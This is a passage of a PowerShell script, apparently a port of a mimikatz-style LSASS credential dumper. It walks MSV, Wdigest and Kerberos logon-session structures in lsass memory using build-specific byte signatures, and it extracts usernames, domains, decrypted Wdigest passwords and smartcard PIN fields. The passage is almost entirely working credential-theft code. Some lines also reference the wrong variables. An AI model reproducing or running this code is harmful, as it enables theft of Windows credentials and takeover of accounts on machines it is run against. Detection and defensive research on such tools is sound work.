	If (($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64) -and ($Global:BUILD_WIN_10_1803 -gt $Global:BUILD_WIN_BLUE))
	{
		$Ptr_Entry_Loc = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($Ptr_Entry_Loc)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry_Loc
			If ($Buff)
			{
				$MSVDecryptor["Logon_Session_Count"] = [Uint32]$Buff[$OffAddr]
			}
		}
	}
	Else
	{
		$MSVDecryptor["Logon_Session_Count"] = 1
	}

	# Get logon session pointer
	$Addr = $SigPos + $MSVDecryptor["Decryptor_Template"]["First_Entry_Offset"]
	$Ptr_Entry_Loc = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr $Dump["SysInfo"]["ProcessorArchitecture"]
	If ($Ptr_Entry_Loc)
	{
		$Ptr_Entry = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry_Loc $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($Ptr_Entry)
		{
			For ($i = 0; $i -lt $MSVDecryptor["Logon_Session_Count"]; $i += 1)
			{
				$Addr = $Ptr_Entry_Loc
				For ($x = 0; $x -lt ($i * 2); $x += 1) # Skipping offset in an architecture-agnostic way, does nothing just moves the position
				{
					If ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
					{
						$Addr += 8
					}
					Else
					{
						$Addr += 4
					}
				}

				$Ptr_Entry_Loc = $Addr
				$Ptr_Entry = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry_Loc $Dump["SysInfo"]["ProcessorArchitecture"]

				If ($Ptr_Entry)
				{
					If ($Ptr_Entry_Loc -eq $Ptr_Entry)
					{
						# When there are multiple logon sessions (modern windows) there are cases when the
						# logon session list doesnt exist anymore. Worry not, there are multiple of them,
						# but we need to skip the ones that are empty (eg. pointer points to itself)
						Continue
					}

					Walk-List $MSVDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry $Ptr_Entry_Loc ((Get-Item "function:Add-Entry").ScriptBlock) $MSVDecryptor["Decryptor_Template"]["List_Entry"] 0
				}
			}
		}
	}

	return $MSVDecryptor
}

<#
	Wdigest Templates
#>
function LSASS-Get-WdigestSecrets($Dump, $LSADecryptor)
{
	<### Wdigest Templates ###>

	$WdigestTemplate = @{}
	$WdigestTemplate["Signature"] = $Null
	$WdigestTemplate["First_Entry_Offset"] = $Null
	$WdigestTemplate["List_Entry"] = $Null
	$WdigestTemplate["Primary_Offset"] = $Null

	function WdigestListEntry($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Usage_Count"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["This_Entry"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["LUID"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["LUID"]

		return
	}

	If ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_INTEL)
	{
		# Processor x86
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
		{
			$WdigestTemplate["Signature"] = @(0x74, 0x11, 0x8b, 0x0b, 0x39, 0x4e, 0x10)
			$WdigestTemplate["First_Entry_Offset"] = -6
			$WdigestTemplate["List_Entry"] = (Get-Item "function:WdigestListEntry").ScriptBlock
			$WdigestTemplate["Primary_Offset"] = 32
		}
		ElseIf (($Global:MINBUILD_WIN_BLUE -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_10))
		{
			$WdigestTemplate["Signature"] = @(0x74, 0x15, 0x8b, 0x0a, 0x39, 0x4e, 0x10)
			$WdigestTemplate["First_Entry_Offset"] = -4
			$WdigestTemplate["List_Entry"] = (Get-Item "function:WdigestListEntry").ScriptBlock
			$WdigestTemplate["Primary_Offset"] = 32
		}
		ElseIf (($Global:MINBUILD_WIN_10 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1809))
		{
			$WdigestTemplate["Signature"] = @(0x74, 0x15, 0x8b, 0x0a, 0x39, 0x4e, 0x10)
			$WdigestTemplate["First_Entry_Offset"] = -6
			$WdigestTemplate["List_Entry"] = (Get-Item "function:WdigestListEntry").ScriptBlock
			$WdigestTemplate["Primary_Offset"] = 32
		}
		Else
		{
			$WdigestTemplate["Signature"] = @(0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10)
			$WdigestTemplate["First_Entry_Offset"] = -6
			$WdigestTemplate["List_Entry"] = (Get-Item "function:WdigestListEntry").ScriptBlock
			$WdigestTemplate["Primary_Offset"] = 32
		}
	}
	ElseIf ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
	{
		# Processor x64
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		Else
		{
			$WdigestTemplate["Signature"] = @(0x48, 0x3b, 0xd9, 0x74)
			$WdigestTemplate["First_Entry_Offset"] = -4
			$WdigestTemplate["List_Entry"] = (Get-Item "function:WdigestListEntry").ScriptBlock
			$WdigestTemplate["Primary_Offset"] = 48
		}
	}

	<### Wdigest Decryptor ###>

	$WdigestDecryptor = @{}
	$WdigestDecryptor["Decryptor_Template"] = $WdigestTemplate
	$WdigestDecryptor["Credentials"] = @()

	<### Functions ###>

	# Callback functions
	# Use same signature : $WdigestDecryptor, $Handle, $Pages, $Entry, $EntryAddr
	function Add-Entry($WdigestDecryptor, $Handle, $Pages, $Entry, $EntryAddr)
	{
		$WdigestCredential = @{}
		$WdigestCredential["CredType"] = "Wdigest"
		$WdigestCredential["UserName"] = $Null
		$WdigestCredential["Domain"] = $Null
		$WdigestCredential["Password"] = $Null
		$WdigestCredential["LUID"] = $Null

		$WdigestCredential["LUID"] = $Entry["LUID"]["Value"]

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["This_Entry"] + $WdigestDecryptor["Decryptor_Template"]["Primary_Offset"])
		If ($Buff)
		{
			$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
			$BaseAddr += $OffAddr
			$Offset = 0

			$Struct = @{}

			$Struct["UserName"] = @{}
			GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $Struct["UserName"]

			$Struct["Domain"] = @{}
			GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $Struct["Domain"]

			$Struct["EncryptedPwd"] = @{}
			GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $Struct["EncryptedPwd"]

			$WdigestCredential["UserName"] = ""
			If ($Struct["UserName"]["Buffer"] -ne 0)
			{
				$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Struct["UserName"]["Buffer"])
				If ($Buff)
				{
					If ($Struct["UserName"]["Length"] -gt 0)
					{
						$Buff = $Buff[$OffAddr..($OffAddr + $Struct["UserName"]["Length"] - 1)]
						$WdigestCredential["UserName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
					}
				}
			}

			$WdigestCredential["Domain"] = ""
			If ($Struct["Domain"]["Buffer"] -ne 0)
			{
				$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Struct["Domain"]["Buffer"])
				If ($Buff)
				{
					If ($Struct["Domain"]["Length"])
					{
						$Buff = $Buff[$OffAddr..($OffAddr + $Struct["Domain"]["Length"] - 1)]
						$WdigestCredential["Domain"] = [System.Text.Encoding]::Unicode.GetString($Buff)
					}
				}
			}

			$WdigestCredential["Password"] = @()
			If ($Struct["EncryptedPwd"]["Buffer"] -ne 0)
			{
				$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Struct["EncryptedPwd"]["Buffer"])
				If ($Buff)
				{
					If ($Struct["EncryptedPwd"]["MaximumLength"] -gt 0)
					{
						$EncPwd = $Buff[$OffAddr..($OffAddr + $Struct["EncryptedPwd"]["MaximumLength"] - 1)]
						$WdigestCredential["Password"] = LSADecrypt-Pwd $MSVDecryptor["LSA_Decryptor"] $EncPwd $WdigestCredential["UserName"] $False
					}
				}
			}

			If (($WdigestCredential["UserName"] -eq "") -and ($WdigestCredential["Domain"] -eq "") -and (@(Compare-Object $WdigestCredential["Password"] (New-Object byte[] ($WdigestCredential["Password"].Length)) -SyncWindow 0).Length -eq 0))
			{
				return
			}

			$WdigestDecryptor["Credentials"] += ,($WdigestCredential)
		}
	}

	# Find Wdigest signature address in wdigest.dll pages
	$SigPos = $Null
	$SigIndexes = $Null
	ForEach ($Module in $Dump["LsassModules"])
	{
		If ($Module["Name"] -eq "wdigest.dll")
		{
			ForEach ($Page in $Module["Pages"])
			{
				$PageBuff, $SigIndexes = SearchMemory $Dump["LsassHandle"] @($Page) $Page["BaseAddress"] $WdigestDecryptor["Decryptor_Template"]["Signature"]
				If ($SigIndexes)
				{
					If ($SigIndexes.Count -gt 1)
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes[0]
					}
					Else
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes
					}

					Break
				}
			}
		}

		If ($SigIndexes) { Break }
	}
	If (-not $SigPos)
	{
		Write-Host ("[-] Unable to find Wdigest signature into wdigest.dll module")
		return $Null
	}
	Write-Host ("[+] Found Wdigest signature at address 0x{0:X8} into wdigest.dll module. Parsing entries" -f ($SigPos))

	# Iterate over Wdigest entries
	$Addr = $SigPos + $WdigestDecryptor["Decryptor_Template"]["First_Entry_Offset"]
	$Ptr_Entry_Loc = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr $Dump["SysInfo"]["ProcessorArchitecture"]
	If ($Ptr_Entry_Loc)
	{
		$Ptr_Entry = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry_Loc $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($Ptr_Entry)
		{
			Walk-List $WdigestDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry $Ptr_Entry_Loc ((Get-Item "function:Add-Entry").ScriptBlock) $WdigestDecryptor["Decryptor_Template"]["List_Entry"] 0
		}
	}

	return $WdigestDecryptor
}

<#
	Kerberos Templates
#>
function LSASS-Get-KerberosSecrets($Dump, $LSADecryptor)
{
	<### Kerberos Templates ###>

	$KerberosTemplate = @{}
	$KerberosTemplate["Signature"] = $Null
	$KerberosTemplate["First_Entry_Offset"] = $Null
	$KerberosTemplate["Kerberos_Session_Struct"] = $Null
	$KerberosTemplate["Kerberos_Ticket_Struct"] = $Null
	$KerberosTemplate["Keys_List_Struct"] = $Null
	$KerberosTemplate["Hash_Password_Struct"] = $Null
	$KerberosTemplate["CSP_Info_Struct"] = $Null

	function Read-WCharNull($Buff, $ValOffset)
	{
		$Offset = $ValOffset
		$Buff = $Buff[$Offset..($Buff.Length - 1)]
		$Data = @()
		$I = 0
		$NC = 0
		While ($I -lt 255)
		{
			If ($NC -eq 3) { Break }

			$C = ReadBuff $Buff 1 ([ref]$Offset)
			If ($C -eq 0x00) { $NC += 1 }
			Else { $NC = 0 }

			$Data += ,($C)
			$I += 1
		}

		return ([System.Text.Encoding]::Unicode.GetString($Data))
	}

	function Get-Infos($Buff, $StructToWrite, $nCardNameOffset, $nReaderNameOffset, $nContainerNameOffset, $nCSPNameOffset)
	{
		$StructToWrite["CardName"] = Read-WCharNull $Buff $nCardNameOffset
		$StructToWrite["ReaderName"] = Read-WCharNull $Buff $nReaderNameOffset
		$StructToWrite["ContainerName"] = Read-WCharNull $Buff $nContainerNameOffset
		$StructToWrite["CSPName"] = Read-WCharNull $Buff $nCSPNameOffset

		return
	}

	function KERB_SMARTCARD_CSP_INFO($Buff, $StructToWrite, $BaseAddr, $Size)
	{
		$Offset = 0
		$StructToWrite["MessageType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["ContextInformation"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["SpaceHolderForWow64"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong64"
		$StructToWrite["Flags"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["KeySpec"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["nCardNameOffset"] = ((GetType $Buff $BaseAddr ([ref]$Offset) "ULong") * 2)
		$StructToWrite["nReaderNameOffset"] = ((GetType $Buff $BaseAddr ([ref]$Offset) "ULong") * 2)
		$StructToWrite["nContainerNameOffset"] = ((GetType $Buff $BaseAddr ([ref]$Offset) "ULong") * 2)
		$StructToWrite["nCSPNameOffset"] = ((GetType $Buff $BaseAddr ([ref]$Offset) "ULong") * 2)
		$StructToWrite["bBuffer"] = ReadBuff $Buff ($Size - $Offset + 4) ([ref]$Offset)

		return
	}

	function KIWI_KERBEROS_CSP_INFOS_60($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["PinCode"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["PinCode"]
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["CertificateInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UnkData"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Flags"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["unkFlags"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["CspDataLength"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["CspData"] = @{}
		KERB_SMARTCARD_CSP_INFO $Buff $StructToWrite["CspData"] $StructToWrite["CspDataLength"]

		return
	}

	function KIWI_KERBEROS_CSP_INFOS_62($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$Struct["PinCode"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["PinCode"]
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["CertificateInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UnkData"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Flags"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["unkFlags"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["CspDataLength"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["CspData"] = @{}
		KERB_SMARTCARD_CSP_INFO $Buff $StructToWrite["CspData"] $StructToWrite["CspDataLength"]

		return
	}

	function KIWI_KERBEROS_CSP_INFOS_10($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$Struct["PinCode"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["PinCode"]
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["CertificateInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UnkData"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Flags"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["unkFlags"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["CspDataLength"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["CspData"] = @{}
		KERB_SMARTCARD_CSP_INFO $Buff $StructToWrite["CspData"] $StructToWrite["CspDataLength"]

		return
	}

	function KIWI_GENERIC_PRIMARY_CREDENTIAL($Buff, $StructToWrite, $BaseAddr, [ref]$Offset)
	{
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["Domain"]
		$StructToWrite["Password"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["Password"]

		return
	}

	function KIWI_KERBEROS_10_PRIMARY_CREDENTIAL($Buff, $StructToWrite, $BaseAddr, [ref]$Offset)
	{
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["Domain"]
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr $Offset "PVoid"
		$StructToWrite["Password"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["Password"]

		return
	}

	$Global:LSAISO_DATA_BLOB_SIZE = 100
	function LSAISO_DATA_BLOB($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["StructSize"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["typeSize"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["UnkKeyData"] = ReadBuff $Buff (3 * 16) ([ref]$Offset)
		$StructToWrite["UnkData2"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["OrigSize"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["Data"] = $Null

		return
	}

	function ENC_LSAISO_DATA_BLOB($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["UnkData1"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["UnkData2"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["Data"] = $Null

		return
	}

	function KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO($Buff, $StructToWrite, $BaseAddr, [ref]$Offset)
	{
		$StructToWrite["StructSize"] = GetType $Buff $BaseAddr $Offset "DWord"
		$Offset.Value = AlignAddress $BaseAddr ($Offset.Value)
		$StructToWrite["IsoBlob"] = GetType $Buff $BaseAddr $Offset "PVoid"

		return
	}

	function KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607($Buff, $StructToWrite, $BaseAddr, [ref]$Offset)
	{
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["Domain"]
		$Struct["UnkFunction"] = GetType $Buff $BaseAddr $Offset "PVoid"
		$Struct["Type"] = GetType $Buff $BaseAddr $Offset "DWord"
		$Offset.Value = AlignAddress $BaseAddr ($Offset.Value)
		$StructToWrite["Password"] = @{}
		GetType $Buff $BaseAddr $Offset "LSA_Unicode_String" $StructToWrite["Password"]
		$StructToWrite["IsoPassword"] = @{}
		KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO $Buff $StructToWrite["IsoPassword"] $BaseAddr $Offset

		return
	}

	function KIWI_KERBEROS_LOGON_SESSION($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["UsageCount"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk0"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Unk0"]
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $Struct
		$StructToWrite["LocallyUniqueIdentifier"] = $Struct["Value"]
		$Offset = AlignAddress $BaseAddr $Offset 8
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk7"] = $Struct["Value"]
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Credentials"] = @{}
		KIWI_GENERIC_PRIMARY_CREDENTIAL $Buff $StructToWrite["Credentials"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk16"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk17"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk18"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["pKeyList"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Tickets_1"] = @{}
		$StructToWrite["Tickets_1"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_1"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_1"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk24"] = $Struct["Value"]
		$StructToWrite["Tickets_2"] = @{}
		$StructToWrite["Tickets_2"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_2"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_2"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk25"] = $Struct["Value"]
		$StructToWrite["Tickets_3"] = @{}
		$StructToWrite["Tickets_3"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_3"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Tickets_3"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk26"] = $Struct["Value"]
		$StructToWrite["SmartcardInfos"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_KERBEROS_LOGON_SESSION_10_X86($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["UsageCount"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk0"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "List_Entry" $StructToWrite["Unk0"]
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk2"] = $Struct["Value"]
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $Struct
		$StructToWrite["LocallyUniqueIdentifier"] = $Struct["Value"]
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk7"] = $Struct["Value"]
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8b"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["Unk9"] = $Struct["Value"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$StructToWrite["Credentials"] = @{}
		KIWI_KERBEROS_10_PRIMARY_CREDENTIAL $Buff $StructToWrite["Credentials"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk16"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk17"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk24"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk25"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["pKeyList"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk26"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Tickets_1"] = @{}
		$StructToWrite["Tickets_1"]["Flink_Loc"] = ($BaseAddr + $Offset)
		$StructToWrite["Tickets_1"]["Blink_Loc"] = ($BaseAddr + $Offset + ([System.IntPtr]::Size))
